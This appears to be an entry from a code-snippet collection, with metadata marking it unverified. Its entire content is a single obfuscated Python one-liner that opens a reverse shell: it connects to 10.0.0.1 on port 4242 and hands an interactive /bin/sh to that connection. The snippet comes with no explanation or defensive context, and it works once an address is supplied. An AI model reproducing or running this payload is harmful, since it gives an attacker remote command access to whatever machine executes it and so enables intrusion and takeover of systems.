---
id: 00f1af55-55b5-4a4b-a916-4e7666e572f4
type: code
language: Python
verified: false
created_at: '2023-04-06T03:56:24.246423+00:00'
updated_at: '2023-04-10T20:25:25.998104+00:00'
---

# Code Snippet 00f1af55

**Language**: Python

```python
python -c 'a=__import__;b=a("socket").socket;c=a("subprocess").call;s=b();s.connect(("10.0.0.1",4242));f=s.fileno;c(["/bin/sh","-i"],stdin=f(),stdout=f(),stderr=f())'
```


